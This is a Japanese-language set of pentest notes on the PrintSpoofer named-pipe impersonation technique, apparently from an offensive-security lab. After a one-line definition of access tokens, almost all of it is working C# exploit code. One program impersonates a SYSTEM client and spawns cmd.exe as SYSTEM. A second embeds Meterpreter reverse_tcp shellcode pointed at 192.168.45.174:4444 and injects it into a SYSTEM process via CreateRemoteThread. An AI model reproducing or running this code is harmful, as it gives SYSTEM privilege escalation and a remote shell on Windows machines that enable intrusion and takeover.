# アクセストークンとは
ユーザの権限情報を追跡する仕組みがアクセストークンで、ユーザ認証時にカーネルによってSIDと紐づけけられて生成される。

# PrintSpoofer

利用する名前付きパイプでPrintSpooferのクライアント待機
```
PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
```

別コマンドプロントを起動し、SpoolSampleでprint spooler serviceをクライアントに繋がせる。(appsrv01はホスト名を入れる)
```
SpoolSample.exe appsrv01 appsrv01/pipe/test
```

システム権限でcmd.exeを立ち上げる
```c#
using System;
using System.Runtime.InteropServices;

namespace PrintSpooferNet
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }
            string pipeName = args[0];

            // パイプサーバーを作成し、接続を待つ
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            ConnectNamedPipe(hPipe, IntPtr.Zero);

            // 接続してきたクライアント(SYSTEM)になりすます
            ImpersonateNamedPipeClient(hPipe);

            // なりすましトークンを開いてSIDを確認（S-1-5-18ならSYSTEM）
            IntPtr hToken;
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

            int TokenInfLength = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine(@"Found sid {0}", sidstr);

            // impersonationトークンをprimaryトークンに複製
            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

            // SYSTEM権限でcmd.exeを起動
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);
        }
    }
}
```


シェルコード実行版
```c#
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace PrintSpooferNet
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        // ===== CreateProcessWithTokenW による SYSTEM プロセス生成 + 注入 用 =====
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // この環境のkernel32は接尾辞なし "GetProcAddress" のみエクスポート (A/W版なし)
        // -> 接尾辞なしエントリはANSIバリアントなので明示CharSet.Ansiで結合
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true, EntryPoint = "GetModuleHandleW")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, EntryPoint = "GetProcAddress")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        // P/Invokeスタブのネイティブアドレスを取得するためのデレゲート（GetProcAddress失敗時のフォールバック）
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool ILUDelegate(IntPtr hToken);
        static object _iluStubRoot;

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }
            string pipeName = args[0];
            bool skipImp = args.Length > 1 && args[1] == "skip";

            // stdoutをfileリダイレクトした際にバッファで止めず即flushする
            Console.SetOut(new StreamWriter(Console.OpenStandardOutput()) { AutoFlush = true });

            // パイプサーバー作成・接続待ち
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            Console.WriteLine("CreateNamedPipe: {0} (err {1})", hPipe != IntPtr.Zero, hPipe != IntPtr.Zero ? 0 : Marshal.GetLastWin32Error());
            bool cnOk = ConnectNamedPipe(hPipe, IntPtr.Zero);
            Console.WriteLine("ConnectNamedPipe: {0} (err {1})", cnOk, cnOk ? 0 : Marshal.GetLastWin32Error());

            // 接続してきたクライアント(SYSTEM)になりすます
            bool impOk = ImpersonateNamedPipeClient(hPipe);
            Console.WriteLine("ImpersonateNamedPipeClient: {0} (err {1})", impOk, impOk ? 0 : Marshal.GetLastWin32Error());

            // なりすましトークンを取得してSIDを確認（S-1-5-18ならSYSTEM）
            IntPtr hToken;
            bool otOk = OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
            Console.WriteLine("OpenThreadToken: {0} (err {1})", otOk, otOk ? 0 : Marshal.GetLastWin32Error());

            int TokenInfLength = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, 0, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
            bool giOk = GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
            Console.WriteLine("GetTokenInformation: {0} (err {1}, len {2})", giOk, giOk ? 0 : Marshal.GetLastWin32Error(), TokenInfLength);

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            Console.WriteLine("Found sid {0}", Marshal.PtrToStringAuto(pstr));

            // primary SYSTEM トークンの取得はシェルコード定義後に行う
            // -> elevation mismatch (err 1346) 対策: ImpersonateLoggedOnUser 後の自己トークン複製に切り替える

            // meterpreter reverse_tcp (x64) -> 192.168.45.174:4444
            byte[] shellcode = new byte[510] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,
0xd2,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,
0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,
0x8b,0x52,0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,0x01,0xd0,0x66,
0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x50,0x8b,0x48,0x18,
0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x4d,0x31,0xc9,
0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x41,0x58,0x48,0x01,0xd0,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,
0xc0,0xa8,0x2d,0xae,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
0xd5,0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,
0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,
0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,
0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,
0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,
0xce,0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,
0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,
0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,
0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,
0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,
0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,
0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,
0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,
0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,
0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,
0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,
0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
            };

            // ============ primary SYSTEM トークンの取得 (elevation mismatch / err 1346 対策) ============
            IntPtr hSystemToken = IntPtr.Zero;
            bool tokOk = false;

            // 1) 正規: impersonation トークンを primary に複製 (呼び出し側が SYSTEM なら成功)
            bool dupOk = DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
            Console.WriteLine("DuplicateTokenEx(imp 0xF01FF): {0} (err {1})", dupOk, dupOk ? 0 : Marshal.GetLastWin32Error());
            if (dupOk) tokOk = true;

            // 2) 代替: プロセス自身のトークン (exe が SYSTEM として動けばそのまま SYSTEM primary)
            if (!tokOk)
            {
                IntPtr hOwn = IntPtr.Zero;
                bool opOk = OpenProcessToken(GetCurrentProcess(), 0xF01FF, out hOwn);
                Console.WriteLine("OpenProcessToken(own): {0} (err {1})", opOk, opOk ? 0 : Marshal.GetLastWin32Error());
                if (opOk)
                {
                    hSystemToken = hOwn;
                    tokOk = true;
                    Console.WriteLine("Using process own token");
                }
            }

            // 3) 最終手段: ImpersonateLoggedOnUser 後の自己トークン
            if (!tokOk)
            {
                bool iluOk = ImpersonateLoggedOnUser(hToken);
                Console.WriteLine("ImpersonateLoggedOnUser: {0} (err {1})", iluOk, iluOk ? 0 : Marshal.GetLastWin32Error());
                IntPtr hSelfToken = IntPtr.Zero;
                bool otSelf = OpenThreadToken(GetCurrentThread(), 0xF01FF, true, out hSelfToken);
                Console.WriteLine("OpenThreadToken(self): {0} (err {1})", otSelf, otSelf ? 0 : Marshal.GetLastWin32Error());
                if (otSelf)
                {
                    hSystemToken = hSelfToken;
                    tokOk = true;
                    Console.WriteLine("Using self token (last resort)");
                }
            }

            if (!tokOk || hSystemToken == IntPtr.Zero)
            {
                Console.WriteLine("TOKEN_FAILED_ABORT (primary SYSTEM トークン未取得)");
                return;
            }
            Console.WriteLine("Using SYSTEM token: 0x{0}", hSystemToken.ToString("X"));

            // (2) SYSTEM プロセスを起動 (メインスレッドは suspend; ロード済み DLL は shellcode が使用可能)
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            const uint CREATE_SUSPENDED = 0x00000004;
            bool cpOk = CreateProcessWithTokenW(hSystemToken, 0, "C:\\Windows\\System32\\cmd.exe", "cmd.exe /k", CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
            Console.WriteLine("CreateProcessWithTokenW: {0} (err {1}, pid {2})", cpOk, cpOk ? 0 : Marshal.GetLastWin32Error(), pi.dwProcessId);
            if (!cpOk)
            {
                Console.WriteLine("CREATEPROC_FAILED_ABORT");
                return;
            }

            // (3) shellcode (meterpreter stager) を新プロセスに配置 (RWX)
            IntPtr remoteMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            Console.WriteLine("VirtualAllocEx: {0} (err {1}, ptr 0x{2})", remoteMem != IntPtr.Zero, remoteMem != IntPtr.Zero ? 0 : Marshal.GetLastWin32Error(), remoteMem.ToString("X"));
            if (remoteMem == IntPtr.Zero) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return; }

            IntPtr nativeBuf = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, nativeBuf, shellcode.Length);
            uint written = 0;
            bool wmOk = WriteProcessMemory(pi.hProcess, remoteMem, nativeBuf, (uint)shellcode.Length, out written);
            Marshal.FreeHGlobal(nativeBuf);
            Console.WriteLine("WriteProcessMemory: {0} (err {1}, written {2})", wmOk, wmOk ? 0 : Marshal.GetLastWin32Error(), written);
            if (!wmOk) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return; }

            // (4) stager を実行 (1MB スタック)
            IntPtr hRemoteThread = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0x100000, remoteMem, IntPtr.Zero, 0, out IntPtr remoteTid);
            Console.WriteLine("CreateRemoteThread: {0} (err {1}, tid {2})", hRemoteThread != IntPtr.Zero, hRemoteThread != IntPtr.Zero ? 0 : Marshal.GetLastWin32Error(), remoteTid);
            if (hRemoteThread == IntPtr.Zero) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return; }

            Console.WriteLine("INJECTION_DONE pid={0} -> meterpreter が 4444 へ接続すべき (SYSTEM)", pi.dwProcessId);

            // (5) メインプロセスは存続しパイプ/セッションを保持 (meterpreter 接続を待つ)
            while (true)
            {
                Thread.Sleep(1000);
            }
        }
    }
}
```